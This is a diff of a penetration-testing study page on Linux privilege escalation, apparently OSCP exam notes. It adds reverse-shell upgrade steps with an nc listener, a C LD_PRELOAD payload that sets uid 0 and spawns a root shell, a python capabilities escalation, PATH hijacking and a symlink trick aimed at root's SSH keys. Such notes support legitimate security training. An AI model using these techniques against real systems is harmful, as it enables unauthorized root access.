@@ -4,16 +4,57 @@ description: watch pspy
 
 # Linux Privesc
 
-{% embed url="https://github.com/RajChowdhury240/OSCP-CheatSheet/blob/main/Linux%20-%20Privilege%20Escalation.md#systemd-timers" %}
+{% embed url="https://github.com/RajChowdhury240/OSCP-CheatSheet/blob/main/Linux%20-%20Privilege%20Escalation.md" %}
 
-incorrect path, scripts running as root, cronjobs, docker container, git server
+### Web Reverse Shell&#x20;
 
-there are some crazy techniques ippsec and tj the plugs, we gonna document those and any cool ones we do here
+* App config file
+* Server access (.htaccess, 000-default.conf)
+* Git server
+* Scripts that can run as elevated user - cronjob, path injection
+* Docker container
+
+Expose creds for valid user in system or privesc and generate SSH keys
+
+{% embed url="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" %}
+
+```bash
+bash -c '[revshell payload]' #The single quotes make a big difference
+```
+
+{% code title="Upgrade Reverse Shell" %}
+```bash
+TTY Shells
+python[3] -c 'import pty; pty.spawn("/bin/bash")'
+/usr/bin/script -qc /bin/bash /dev/null
+Ctrl-Z
+
+TTY Stabilization
+# In Kali
+echo $TERM 
+stty -a
+
+stty raw -echo; fg
+
+# In reverse shell
+reset
+export SHELL=bash
+export TERM=xterm-256color [matching same TERM as that of our kali shell]
+stty rows <num> columns <cols> [get values from stty -a]
+
+SOCAT
+sudo apt install rlwrap
+rlwrap nc -lvnp <port>
+```
+{% endcode %}
+
+<div align="left"><figure><img src="../.gitbook/assets/image (1).png" alt="" width="419"><figcaption></figcaption></figure></div>
 
 ## Checklist
 
 * Kernel and distribution release details
 * Can you:
+  * Read ENV variables `/proc/self/environ`
   * Add to sudoers
   * Copy file, change ownership, symlink
   * Revshell
@@ -85,55 +126,101 @@ there are some crazy techniques ippsec and tj the plugs, we gonna document those
 
 ### Sudo and SUID
 
+#### SUDO
+
+Run a file as another user entirely
+
+If `LD_PRELOAD` is explicitly defined in the sudoers file
+
 ```
-sudo -l
+Defaults        env_keep += LD_PRELOAD
+```
+
+Compile the following shared object using the C code below with \
+`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+	unsetenv("LD_PRELOAD");
+	setgid(0);
+	setuid(0);
+	system("/bin/sh");
+}
+```
+
+Execute any binary with the LD\_PRELOAD to spawn a shell : \
+`sudo LD_PRELOAD=<full_path_to_so_file> <program>`\
+e.g: `sudo LD_PRELOAD=/tmp/shell.so find`
+
+#### SUID
+
+Run a file with the file permissions of the owner itself
+
+```bash
 find / -perm -g=s -type f 2>/dev/null    # SGID
 find / -perm -u=s -type f 2>/dev/null    # SUID
-
-find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID < full search  
-for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin < quicker   
-
-find / perm /u=s -user "Username" 2>/dev/null  
 ```
 
-#### Find SUID root files <a href="#find-suid-root-files" id="find-suid-root-files"></a>
+#### Find SUID files <a href="#find-suid-root-files" id="find-suid-root-files"></a>
 
-```
-find / -user root -perm -4000 -print  2>/dev/null
-```
-
-#### Find SGID root files: <a href="#find-sgid-root-files" id="find-sgid-root-files"></a>
-
-```
-find / -group root -perm -2000 -print 2>/dev/null
+```bash
+find / perm /u=s -user "[user]" 2>/dev/null 
+find / -[group/user] [user] -ls 2>/dev/null
+find / -user [user] -perm -4000 -print  2>/dev/null
+find / -group [user] -perm -2000 -print 2>/dev/null
 ```
 
 #### Find SUID and SGID files owned by anyone: <a href="#find-suid-and-sgid-files-owned-by-anyone" id="find-suid-and-sgid-files-owned-by-anyone"></a>
 
-```
+```bash
 find / -perm -4000 -o -perm -2000 -print  2>/dev/null
 ```
 
 ### Capabilities
 
-```
+More complex privilege control, run only specified actions with elevated privilege
+
+```bash
 /usr/bin/getcap -r / 2>/dev/null        # list all 
 /usr/bin/setcap -r /bin/ping            # remove
 /usr/bin/setcap cap_net_raw+p /bin/ping # add
 ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
+### Binary Tracing <a href="#kernel" id="kernel"></a>
+
+```bash
+strace -f [bin] [follows forks too, see the exec calls]
+ltrace [bin] also works lowk
+```
+
 ### PATH <a href="#kernel" id="kernel"></a>
 
-```
+When the exact path of a binary is not called, prepend our's and it gets called first
+
+```bash
 echo $PATH
 export PATH=<PATH/TO/FOLDER>:$PATH
 #BInary to be called is placed and this path will be looked first
 ```
 
+### Symlink
+
+Any operations involving backup/zip/file handling as sudo
+
+```bash
+ln -s [target_file] [source_file]
+#ln -s [/root/.ssh/authorized_keys] [random_file] -> this file points towards SSH key
+```
+
 ### Crontab <a href="#kernel" id="kernel"></a>
 
-```
+Jobs running at particular intervals
+
+```bash
 /etc/init.d
 /etc/cron*
 /etc/crontab
@@ -167,7 +254,7 @@ cat /etc/cron.deny*
 
 {% embed url="https://github.com/jondonas/linux-exploit-suggester-2" %}
 
-```
+```bash
 cat /proc/version
 uname -a
 uname -ar
